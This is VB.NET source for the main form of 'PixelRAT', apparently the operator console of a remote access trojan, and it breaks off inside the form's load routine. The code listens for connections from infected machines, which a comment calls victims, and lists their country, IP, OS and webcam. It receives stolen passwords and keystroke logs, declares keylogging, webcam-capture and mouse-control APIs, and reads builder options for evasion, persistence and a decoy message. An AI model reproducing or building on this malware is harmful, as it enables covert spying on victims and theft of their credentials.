Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System
Imports System.IO
Imports System.Object
Imports System.Drawing
Imports System.Windows.Forms

Imports System.Security.Principal

Imports System.Data

Imports System.Text

Imports System.Threading
Imports System.Net
Imports System.Text.RegularExpressions

Imports System.Xml

Imports System.Configuration
Imports System.Reflection

Imports System.Drawing.Imaging
Imports Microsoft.Win32
Imports System.Management

Public Class Form1
    Dim F, F2 As String
    Function Secure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Function Unsecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Dim rPJtpkrwonhboyGmdmfhuonksrdNaD As String = "1.9"
    Dim mRtBlmqVtIpyjspKbFfehzvZovudfg As String
    Dim NahevnoymOvbLsmfSedriqJlYlrOxv As Integer = NahevnoymOvbLsmfSedriqJlYlrOxv
    Dim nylhFltBlfkvtIjYjmpkbffehsvzov As String
    Dim ucefBnVrjbCmadjiygssGKqfOeqzmZ As String = "no"
    Dim KhQItLqtrXgnrSwJgUvMPydxnllknf As String
    Dim GjrffmijFrGVulFPlgnskjddqvcpzp As String
    Dim mvCvUrbykchkiOwxijnzpfMdGpTOeC As String
    Dim cbewswLyrzcDylaPHfzjfahMeEwqEp As String
    Dim ipgOhjwqpmvtfqcfdjlsdEInkzHQBk As String
    Dim BvlpqPRkhkzgGnpqmyHDuMnxloUaKr As String
    Dim vPdoncSbTvjvcyIgRDOljoXfpJOzWm As String
    Dim sjtvaUkppoRdgkyFfnpqmYgDuLmwln As String
    Dim KizgtthlrfpFqanagdldohMpNsbjmn As String
    Dim ylIwxorbFzpnnmpilowkkrnoKwlbZq As String
    Dim whdxfkbBUuimShqgSchcbXgfqinqou As String
    Dim ijtuylbqxorbFzpnnmpieiwkDlnoKw As String
    Dim etmjEojflqiiCuitahxgZcoiHenmXi As String
    Dim svtyBisTXdbpwgqaxSImmmOHdhvdck As String
    Dim yaviPMEuWguwejtbtnbmlzQyrtHTzw As String
    Dim vuGqDyXdLSexcoLaBrceIDsxxWzlOr As String
    Dim jppwyaviqMfVwHvxeDtbnnBflzjylu As String
    Dim kxdajbmejmkqYGkLPcynofirvqgeed As String = 0
    Dim gycfnBbjefbNcrqhcmhcJoggyzNrxL As New System.Windows.Forms.HelpProvider()
    Dim wmyhNHgDmkvotWuaIJtuzlcqXoRBfa As String
    Dim hffehyvyOCUDegcodRkicMidkpgGat As String
    Dim thepercentage() As String
    Dim jUbiYhbcPjifOmXjvywcelvwbgesaj As Integer
    Dim oXvqgkKkmfbfubaikLhtcXPhiSGJPU As String
    Dim yfySgqqeuewylyEckjUfRnmRahsmqd As String
    Dim tijyjmqlbfffhSvzovudfgCovskcdN As String
    Dim NpWUmtGGtxEscremZmspyqctYcZFOV As String
    Dim KlqczopfiSvqhefegYCgOcbjefBncR As String
    Dim IytEyuBGxxRrfJpEndpxExWtdbmfkn As String
    Dim nSccmNsEuJrhktxsjghgIbxbqdvegh As String
    Dim COdSkicmIdkPhgathsyfWfxaNhgdlk As String 'current victim
    Dim qcnQOuWEOptyvlScMvsndiiHkcydrx As Boolean
    Dim kStvrelhZqrCQsZfPVpJWhhuluNPcp As Boolean
    Dim OlusepCXvckrcvBmkYZPadhcRVvvxj As Integer
    Private Declare Function GetKeyState Lib "USER32" (ByVal vKey As Long) As Integer
    Private Declare Function GetAsyncKeyState Lib "USER32" (ByVal vKey As Long) As Integer
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Dim iskeylog As String
    Dim activewindow As String
    Dim where As String
    Dim savefilepath As String
    Dim THEFILE As String
    Dim filepath As String
    Dim nousers As String = 0
    Private _command As String
    Private isOpen As Boolean
    Public Icount As Integer = 0
    Public PORT_NUM As Integer
    Public IP_NUM As Integer
    Private clients As New Hashtable()
    Private listener As TcpListener
    Private listenerThread As Threading.Thread
    Const READ_BUFFER_SIZE As Integer = 255
    Dim islisten As Integer
    Private client As TcpClient
    Private readBuffer(READ_BUFFER_SIZE) As Byte
    Dim stub As String
    Dim cb As Boolean
    Const Filesplit = "@PixelFragStudios@"
    Public RmoteIP As String
    Public RmotePort As Integer
    Public status As String
    Private PACKET_SIZE As UInt16 = 4096
    Dim desktop As Integer
    Dim server2 As New TcpListener(IPAddress.Any, 8254)
    Dim isdesktop As Integer
    Private filePath2 As String
    Dim alreadyd As Integer = 0
    Private clients2 As New Hashtable()
    Private listener2 As TcpListener
    Private listenerThread2 As Threading.Thread
    Dim errOcr As Boolean
    Private LocalMousePosition As Point
    Private Const MOUSEEVENTF_ABSOLUTE = &H8000
    Private Const MOUSEEVENTF_LEFTDOWN = &H2
    Private Const MOUSEEVENTF_LEFTUP = &H4
    Private Const MOUSEEVENTF_MOVE = &H1
    Private Const MOUSEEVENTF_MIDDLEDOWN = &H20
    Private Const MOUSEEVENTF_MIDDLEUP = &H40
    Private Const MOUSEEVENTF_RIGHTDOWN = &H8
    Private Const MOUSEEVENTF_RIGHTUP = &H10
    Const WM_CAP As Short = &H400S
    Dim whichwindow As String
    Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
    Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
    Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30

    Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
    Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
    Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
    Const WS_CHILD As Integer = &H40000000
    Const WS_VISIBLE As Integer = &H10000000
    Const SWP_NOMOVE As Short = &H2S
    Const SWP_NOSIZE As Short = 1
    Const SWP_NOZORDER As Short = &H4S
    Const HWND_BOTTOM As Short = 1

    Dim iDevice As Integer = 0 ' Current device ID
    Dim hHwnd As Integer ' Handle to preview window


    Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" _
   (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, _
    ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
    Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
        (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, _
        <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer

    Declare Function SetWindowPos Lib "user32" Alias "SetWindowPos" (ByVal hwnd As Integer, _
        ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, _
        ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer

    Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean

    Declare Function capCreateCaptureWindowA Lib "avicap32.dll" _
        (ByVal lpszWindowName As String, ByVal dwStyle As Integer, _
        ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, _
        ByVal nHeight As Short, ByVal hWndParent As Integer, _
        ByVal nID As Integer) As Integer

    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
        ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
        ByVal cbVer As Integer) As Boolean
    Dim compress As String = 5
    Dim id As String
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)

    Private Results As String


    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32


    Private Shared Function loadConfigDocument() As XmlDocument
        Dim doc As XmlDocument = Nothing
        Try
            doc = New XmlDocument()
            doc.Load(getConfigFilePath())
            Return doc
        Catch e As System.IO.FileNotFoundException
            Throw New Exception("No configuration file found.", e)
        End Try
    End Function

    Private Shared Function getConfigFilePath() As String
        Return Application.StartupPath & "\PixelRAT.config"
    End Function




    Public Shared Sub WriteSetting(ByVal key As String, ByVal value As String)
        ' load config document for current assembly







        Dim doc As XmlDocument = loadConfigDocument()

        ' retrieve appSettings node
        Dim node As XmlNode = doc.SelectSingleNode("//appSettings")

        If node Is Nothing Then
            Throw New InvalidOperationException("appSettings section not found in config file.")
        End If

        Try
            ' select the 'add' element that contains the key
            Dim elem As XmlElement = DirectCast(node.SelectSingleNode(String.Format("//add[@key='{0}']", key)), XmlElement)

            If elem IsNot Nothing Then
                ' add value for key
                elem.SetAttribute("value", value)
            Else
                ' key was not found so create the 'add' element 
                ' and set it's key/value attributes 
                elem = doc.CreateElement("add")
                elem.SetAttribute("key", key)
                elem.SetAttribute("value", value)
                node.AppendChild(elem)
            End If
            doc.Save(getConfigFilePath())
        Catch
            Throw
        End Try
    End Sub

    Shared Function GetIPAddress() As String
        Dim IP As System.Net.IPAddress
        Dim IP1 As String
        With System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName())
            IP = New System.Net.IPAddress(.AddressList(0).Address)
            IP1 = IP.ToString
        End With
    End Function


    Private Declare Function FindWindowEx Lib "user32.dll" Alias _
    "FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String, _
    ByVal lpsz2 As String) As Int32 'Find Child Window Of External Window

    Private Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As Int32, _
    ByVal nCmdShow As Int32) As Int32 'Show A Window

    Private Declare Function PostMessage Lib "user32.dll" Alias _
    "PostMessageA" (ByVal hwnd As Int32, ByVal wMsg As Int32, ByVal wParam As Int32, _
    ByVal lParam As Int32) As Int32 'Post Message To Window

    Private Declare Function EnableWindow Lib "user32.dll" (ByVal hwnd As Int32, _
    ByVal fEnable As Int32) As Int32 'Enable A Window

    Private Declare Function SendMessageSTRING Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Int32, _
    ByVal wMsg As Int32, ByVal wParam As Int32, ByVal lParam As String) As Int32 'SendMessage lParam = String

    Declare Auto Function SendMessageTimeout Lib "User32" ( _
    ByVal hWnd As Integer, _
    ByVal Msg As UInt32, _
    ByVal wParam As Integer, _
    ByVal lParam As Integer, _
    ByVal fuFlags As UInt32, _
    ByVal uTimeout As UInt32, _
    ByRef lpdwResult As IntPtr _
    ) As Long 'Send Message & Wait

    Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As  _
    Int32, ByVal wMsg As Int32, ByVal wParam As Int32, ByVal lParam As Int32) As Int32 'Normal SendMessage

    Private Declare Function GetDesktopWindow Lib "user32" () As IntPtr 'Get Handle To Desktop

    Private Const WM_WININICHANGE = &H1A 'INI File Update
    Private Const HWND_BROADCAST = &HFFFF& 'Send To All
    Private Const WM_SETTINGCHANGE = &H1A 'Setting Change
    Private Const SMTO_ABORTIFHUNG = &H2 'Stop If Hang
    Private Const WM_COMMAND As Int32 = &H111 'Send Command
    Private Const WM_USER As Int32 = &H400 'User
    Private Const WM_SETTEXT = &HC 'Change Text
    Private Const WM_GETTEXT = &HD 'Get Text

    Private AB As New TBAppBar 'AppBar Object
#Region "jpegsettings"
    Private Function GetEncoderInfo(ByVal mimeType As String) As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = mimeType Then
                Return encoders(j)
            End If
        Next j '        
        Return Nothing
    End Function
    Private Sub SaveJPGWithCompressionSetting(ByVal image As Image, ByVal szFileName As String, ByVal lCompression As Long)
        On Error GoTo chkErr
        Dim eps As EncoderParameters = New EncoderParameters(1)
        eps.Param(0) = New EncoderParameter(System.Drawing.Imaging.Encoder.Quality, lCompression)
        Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
        image.Save(szFileName, ici, eps)
        Exit Sub
chkErr:
        errOcr = True
        Resume Next

    End Sub
#End Region
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    'constants to be used with the above api
    Private Const SPI_SETDESKWALLPAPER = 20
    Private Const SPIF_UPDATEINIFILE = &H1

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function FindWindow( _
        ByVal lpClassName As String, _
        ByVal lpWindowName As String) As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function GetWindow( _
        ByVal hWnd As IntPtr, _
        ByVal uCmd As UInteger) As IntPtr
    End Function

    Private Enum GetWindowCmd As UInteger
        GW_HWNDFIRST = 0
        GW_HWNDLAST = 1
        GW_HWNDNEXT = 2
        GW_HWNDPREV = 3
        GW_OWNER = 4
        GW_CHILD = 5
        GW_ENABLEDPOPUP = 6
    End Enum

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function ShowWindow( _
        ByVal hwnd As IntPtr, _
        ByVal nCmdShow As Int32) As Boolean
    End Function

    Private Enum SW As Int32
        Hide = 0
        Normal = 1
        ShowMinimized = 2
        ShowMaximized = 3
        ShowNoActivate = 4
        Show = 5
        Minimize = 6
        ShowMinNoActive = 7
        ShowNA = 8
        Restore = 9
        ShowDefault = 10
        ForceMinimize = 11
        Max = 11
    End Enum

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function IsWindowVisible(ByVal hwnd As IntPtr) As Boolean
    End Function

    Public Shared Sub Toggle()
        Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
        hWnd = GetWindow(hWnd, GetWindowCmd.GW_CHILD)

        If IsWindowVisible(hWnd) Then
            ShowWindow(hWnd, SW.Hide)
        Else
            ShowWindow(hWnd, SW.ShowNoActivate)
        End If
    End Sub

    Private Function IsConnectionAvailable() As Boolean
        Dim url As New System.Uri("http://www.google.com/")
        Dim req As System.Net.WebRequest
        req = System.Net.WebRequest.Create(url)
        Dim resp As System.Net.WebResponse
        Try
            resp = req.GetResponse()
            resp.Close()
            req = Nothing
            Return True
        Catch ex As Exception
            req = Nothing
            Return False
        End Try
    End Function

    Private Sub sendback(ByVal data As String)
        Dim writer As New IO.StreamWriter(client.GetStream)
        writer.Write(data & vbCr)
        writer.Flush()
    End Sub
    Public Shared Function DetectOS() As String
        Dim os As OperatingSystem = Environment.OSVersion
        Dim runningOS As String = ""

        If os.Platform.ToString() = "Win32NT" Then
            Select Case OSVersionNoRevision(os.Version)
                Case "4.1.2222"
                    runningOS = "Windows 98"
                    Exit Select
                Case "4.1.2600"
                    runningOS = "Windows 98SE"
                    Exit Select
                Case "4.9.3000"
                    runningOS = "Windows ME"
                    Exit Select
                Case "5.0.2195"
                    runningOS = "Windows 2000"
                    Exit Select
                Case "5.1.2600", "5.2.3790"
                    runningOS = "Windows XP"
                    Exit Select
                Case "6.0.6000", "6.0.6001", "6.0.6002"
                    runningOS = "Windows Vista"
                    Exit Select
                Case "6.1.7600"
                    runningOS = "Windows 7"
                    Exit Select
                Case Else
                    runningOS = "error"
                    Exit Select
            End Select
        End If

        Dim sPack As String = String.Empty
        Dim versionInfo As New OSVERSIONINFOEX()

        versionInfo.dwOSVersionInfoSize = Runtime.InteropServices.Marshal.SizeOf(GetType(OSVERSIONINFOEX))

        If GetVersionEx(versionInfo) Then
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 1") Then
                runningOS += " SP1"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 2") Then
                runningOS += " SP2"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 3") Then
                runningOS += " SP3"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 4") Then
                runningOS += " SP4"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 5") Then
                runningOS += " SP5"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 6") Then
                runningOS += " SP6"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 7") Then
                runningOS += " SP7"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 8") Then
                runningOS += " SP8"
            End If
            If versionInfo.szCSDVersion.ToString.Contains("Service Pack 9") Then
                runningOS += " SP9"
            End If
        End If
        Return runningOS
    End Function

    Private Shared Function OSVersionNoRevision(ByVal ver As Version) As String
        Return ((ver.Major.ToString() & ".") + ver.Minor.ToString() & ".") + ver.Build.ToString()
    End Function


    <Runtime.InteropServices.DllImport("kernel32.dll")> _
    Private Shared Function GetVersionEx(ByRef osVersionInfo As OSVERSIONINFOEX) As Boolean
    End Function

    <Runtime.InteropServices.StructLayout(Runtime.InteropServices.LayoutKind.Sequential)> _
    Structure OSVERSIONINFOEX
        Public dwOSVersionInfoSize As Integer
        Public dwMajorVersion As Integer
        Public dwMinorVersion As Integer
        Public dwBuildNumber As Integer
        Public dwPlatformId As Integer
        <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst:=128)> _
        Public szCSDVersion As String
        Public wServicePackMajor As Short
        Public wServicePackMinor As Short
        Public wSuiteMask As Short
        Public wProductType As Byte
        Public wReserved As Byte
    End Structure

    Private Sub Plague(ByVal strMessage As String)
        Dim client As UserConnection
        Dim entry As DictionaryEntry

        For Each entry In clients
            Try
                client = CType(entry.Value, UserConnection)
                client.sendback(strMessage)
            Catch ex As Exception
            End Try
        Next
    End Sub



    Private Sub OnLineReceived(ByVal sender As UserConnection, ByVal data As String)
        Dim dataArray() As String
        ' Dim Crypter As New PolyMorphic(TextBox11.Text)
        'Dim Crypted As String = Crypter.PolyCrypt(TextBox5.Text)
        dataArray = data.Split(Chr(124))

        Select Case dataArray(0)
            Case "C"
                Dim isconnected As String = "no"

                For i = 0 To ListView1.Items.Count - 1
                    If ListView1.Items.Item(i).SubItems(1).ToString.Contains(dataArray(2)) Then
                        ListView1.Items.Item(i).Remove()
                        ConnectUser(sender, dataArray(1), dataArray(2), dataArray(3), dataArray(4), dataArray(5), dataArray(6), dataArray(7), dataArray(8))
                        isconnected = "yes"
                        nousers += 1
                        Label3.Text = nousers & "/" & ListView1.Items.Count & " connected"
                    End If

                Next

                If isconnected = "no" Then
                    ConnectUser(sender, dataArray(1), dataArray(2), dataArray(3), dataArray(4), dataArray(5), dataArray(6), dataArray(7), dataArray(8))
                    'ConnectUser(sender, dataArray(1), dataArray(2), dataArray(3), dataArray(4))
                    If CheckBox7.Checked = True Then
                        NotifyIcon1.BalloonTipText = ("PixelRat | New Connection: " & dataArray(2) & " - from: " & dataArray(1))
                        NotifyIcon1.ShowBalloonTip(1000)
                        RichTextBox5.Text += "[" & TimeOfDay & "]" & " New Connection: " & dataArray(2) & " - from: " & dataArray(1) & vbNewLine
                        RichTextBox5.SelectionStart = RichTextBox5.TextLength
                        RichTextBox5.ScrollToCaret()
                    End If
                    nousers += 1
                    Label3.Text = nousers & "/" & ListView1.Items.Count & " connected"

                    ' MTheme1.Text = "PixelRAT :: " & nousers & " Connected"
                End If

            Case "INFO"

                'MsgBox("hi")
                ijtuylbqxorbFzpnnmpieiwkDlnoKw = dataArray(1)
                etmjEojflqiiCuitahxgZcoiHenmXi = dataArray(2)

                whdxfkbBUuimShqgSchcbXgfqinqou = "YES"


            Case "KEY"
            Case "FILEINFO"
                Dim lvp As ListViewItem
                lvp = ListView2.Items.Add(dataArray(1))
                lvp.SubItems.Add(dataArray(3))
                lvp.SubItems.Add(dataArray(2))


            Case "LSTCLR2"
                ListView2.Items.Clear()
            Case "LSTCLR"
                ListView3.Items.Clear()
            Case "PASSWORDS"
                If dataArray(1) = "FINISHED" Then
                    MProgress2.Current = MProgress2.Maximum
                    RichTextBox5.Text += "[" & TimeOfDay & "]" & " Retrieving Completed." & vbNewLine
                    RichTextBox5.SelectionStart = RichTextBox5.TextLength
                    RichTextBox5.ScrollToCaret()
                End If
                If dataArray(1) = "LINES" Then
                    jUbiYhbcPjifOmXjvywcelvwbgesaj = dataArray(2)
                    MProgress2.Maximum = jUbiYhbcPjifOmXjvywcelvwbgesaj


                Else


                    MProgress2.Current += 1

                    '      MProgress2.Current += thepercentage(0)
                    If dataArray(1) = "" Then
                        RichTextBox2.Text += vbNewLine
                        RichTextBox2.SelectionStart = RichTextBox2.TextLength
                        RichTextBox2.ScrollToCaret()
                    Else
                        RichTextBox2.Text += dataArray(1)
                        'MProgress2.Current += oXvqgkKkmfbfubaikLhtcXPhiSGJPU
                        RichTextBox2.Text += vbNewLine

                        RichTextBox2.SelectionStart = RichTextBox2.TextLength
                        RichTextBox2.ScrollToCaret()

                    End If
                    RichTextBox2.SelectionStart = RichTextBox2.TextLength
                    RichTextBox2.ScrollToCaret()
                End If
            Case "FINISHEDPROC"

                MButton1.Enabled = True
                Me.Cursor = Cursors.Arrow
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " All processes gathered." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Case "SEARCHEND"
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Search finished. " & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Case "PROCINFO"
                MButton1.Enabled = False
                Me.Cursor = Cursors.WaitCursor
                Dim lvp2 As ListViewItem
                lvp2 = ListView3.Items.Add(dataArray(1))
                lvp2.SubItems.Add(dataArray(2))
                lvp2.SubItems.Add(dataArray(3))

            Case "LOGS"
                RichTextBox1.Text += dataArray(1)
                RichTextBox1.SelectionStart = RichTextBox1.TextLength
                RichTextBox1.ScrollToCaret()
            Case "TALK"
                If islisten = 1 Then
                    '  Me.TextBox4.Text = TextBox4.Text + "Friend says: " + Crypter.PolyDeCrypt(dataArray(1)) + vbNewLine
                End If
            Case "DISCONNECT"
                DisconnectUser(sender)
                '    MsgBox("ListViewSubitem: {" & dataArray(1).ToString & "}")
                For Each item As ListViewItem In ListView1.Items
                    If item.SubItems(1).ToString = "ListViewSubItem: {" & dataArray(1).ToString & "}" Then

                        item.Remove()
                    End If
                Next

                'ListView1.Clear()
        End Select
    End Sub

    Private Sub DisconnectUser(ByVal sender As UserConnection)
        clients.Remove(sender.Name)
        Icount = Icount - 1



    End Sub
    Private Sub ConnectUser(ByVal sender As UserConnection, ByVal Country As String, ByVal IP As String, ByVal OS As String, ByVal UserComp As String, ByVal RAM As String, ByVal cam As String, ByVal ping As String, ByVal version As String)
        'Private Sub ConnectUser(ByVal sender As UserConnection, ByVal Country As String, ByVal IP As String, ByVal OS As String, ByVal UserComp As String)
        sender.Name = IP
        clients.Add(IP, sender)
        Dim strListViewData As String() = {Country, IP, OS, UserComp, RAM, cam, ping, version}
        Dim lviList As New ListViewItem(strListViewData)
        Dim listviewstuff As New ListViewItem(strListViewData)


        ListView1.Items.Add(listviewstuff).ImageIndex = GetFlag(Country.ToLower)


    End Sub
    Private Sub DoListen()
        Try

            listener = New TcpListener(System.Net.IPAddress.Any, TextPort.Text)
            listener.Start()
            Do
                Dim client As New UserConnection(listener.AcceptTcpClient)
                AddHandler client.LineReceived, AddressOf OnLineReceived
            Loop Until False
        Catch
        End Try
    End Sub

    Private Sub SendToClients(ByVal strMessage As String, ByVal sender As UserConnection)
        Dim client As UserConnection
        Dim entry As DictionaryEntry
        ' All entries in the clients Hashtable are UserConnection so it is possible
        ' to assign it safely.
        For Each entry In clients
            client = CType(entry.Value, UserConnection)
            ' Exclude the sender.

            If client.Name <> sender.Name Then

                Try

                    client.sendback(strMessage)
                Catch ex As Exception
                End Try
            End If
        Next
    End Sub



    Private Sub btnListen_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub



    Public Function Md5Get() As String
        Dim MD5 As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim Data() As Byte
        Dim hash() As Byte
        Dim strData As String = IO.File.ReadAllText(Application.ExecutablePath)
        Data = System.Text.Encoding.UTF8.GetBytes(strData)
        hash = MD5.ComputeHash(Data)
        MD5 = Nothing
        Dim strOutput As New System.Text.StringBuilder(hash.Length)
        For i As Integer = 0 To hash.Length - 1
            strOutput.Append(hash(i).ToString("X2"))
        Next
        Return strOutput.ToString().ToLower
    End Function
    Dim tried As String = "no"
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Me.Height = 522
        Me.Width = 710
        ' Dim md5 As String = "hi"
        ' Dim wc = New System.Net.WebClient
        ' Try
        'md5 = wc.DownloadString("http://www.pixelfrag.com/pixelrat/md5hashchecker.txt") ' < You Url here with the MD5 textfile: www.example.com/md5.txt
        ' tried = "yes"
        ' Catch ex As Exception
        ' tried = "no"
        ' MsgBox("Error x000 Please check your internet connection.")
        '  Try
        '     Dim pProcess() As Process = System.Diagnostics.Process.GetProcessesByName(FileNameWithoutExtension(Application.ExecutablePath))
        'pProcess(0).Kill()
        '  For Each p As Process In pProcess
        'p.Kill()
        ' Next

        ' Catch exds As Exception
        ' End Try
        ' End Try

        ' If md5.Contains(Md5Get()) Then
        'If tried = "yes" Then
        'Me.Focus()
        'End If
        'End If

        Dim data As String

        If Not System.IO.File.Exists(Application.StartupPath & "\PixelRAT.config") = True Then
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\PixelRAT.config", My.Resources.String1, False)
        End If

        If Not File.Exists(Application.StartupPath & "\Listen.ini") Then
            Dim Config As New StreamWriter("Listen.ini")
            Config.Dispose()
            Config.Close()
        End If

        If Not File.Exists(Application.StartupPath & "\Build.ini") Then
            Dim Config As New StreamWriter("Build.ini")
            Config.Dispose()
            Config.Close()
        End If

        If Not File.Exists(Application.StartupPath & "\DNS.ini") Then
            Dim Config As New StreamWriter("DNS.ini")
            Config.Dispose()
            Config.Close()
        End If

        RichTextBox5.Text = "[" & TimeOfDay & "]" & " Configuring PixelRAT..." & vbNewLine

        Dim IPERZ As String = System.Configuration.ConfigurationSettings.AppSettings("IP")
        Dim MSGBODY As String = System.Configuration.ConfigurationSettings.AppSettings("MSGBODY")
        Dim MSGTITLE As String = System.Configuration.ConfigurationSettings.AppSettings("MSGTITLE")
        TextBox21.Text = IPERZ
        TextBox29.Text = MSGBODY
        TextBox28.Text = MSGTITLE
        Dim ISMSG As String = System.Configuration.ConfigurationSettings.AppSettings("ISMSG")
        Dim ISANTI As String = System.Configuration.ConfigurationSettings.AppSettings("ANTI")
        Dim ISINSTALL As String = System.Configuration.ConfigurationSettings.AppSettings("INSTALL")


        Dim TITLE As String = System.Configuration.ConfigurationSettings.AppSettings("TITLE")
        Dim DESCRIPTION As String = System.Configuration.ConfigurationSettings.AppSettings("DESCRIPTION")
        Dim COMPANY As String = System.Configuration.ConfigurationSettings.AppSettings("COMPANY")
        Dim PRODUCT As String = System.Configuration.ConfigurationSettings.AppSettings("PRODUCT")
        Dim TRADEMARK As String = System.Configuration.ConfigurationSettings.AppSettings("TRADEMARK")
        Dim COPYRIGHT As String = System.Configuration.ConfigurationSettings.AppSettings("COPYRIGHT")

        Form5.TextBox30.Text = TITLE
        Form5.TextBox1.Text = DESCRIPTION
        Form5.TextBox2.Text = COMPANY
        Form5.TextBox2.Text = PRODUCT
        Form5.TextBox2.Text = COPYRIGHT
        Form5.TextBox2.Text = TRADEMARK



        If ISMSG = "YES" Then
            CheckBox13.Checked = True
        Else
            CheckBox13.Checked = False
        End If

        If ISANTI = "YES" Then
            CheckBox12.Checked = True
        Else
            CheckBox12.Checked = False
        End If

        If ISINSTALL = "YES" Then
            CheckBox11.Checked = True
        Else
            CheckBox11.Checked = False
        End If

        MProgress1.Color1 = Color.Black
        MProgress2.Color1 = Color.Black
        MProgress3.Color1 = Color.Black
        MProgress1.Color2 = Color.FromArgb(192, 0, 0)
        MProgress2.Color2 = Color.FromArgb(192, 0, 0)
        MProgress3.Color2 = Color.FromArgb(192, 0, 0)
        PictureBox3.Image = System.Drawing.SystemIcons.Information.ToBitmap
        PictureBox4.Image = System.Drawing.SystemIcons.Question.ToBitmap
        PictureBox5.Image = System.Drawing.SystemIcons.Exclamation.ToBitmap
        PictureBox6.Image = System.Drawing.SystemIcons.Error.ToBitmap


        Dim PORT1 As String = System.Configuration.ConfigurationSettings.AppSettings("PORT1")
        Dim PORT2 As String = System.Configuration.ConfigurationSettings.AppSettings("PORT2")
        Dim notify As String = System.Configuration.ConfigurationSettings.AppSettings("NOTIFY")
        If notify = "YES" Then
            CheckBox7.Checked = True
        Else
            CheckBox7.Checked = False
        End If
        'TextBox1.Text = PORT1
        'TextPort.Text = PORT2
        'TextBox22.Text = PORT1
        'TextBox23.Text = PORT2

        'GET IP FUNCTION

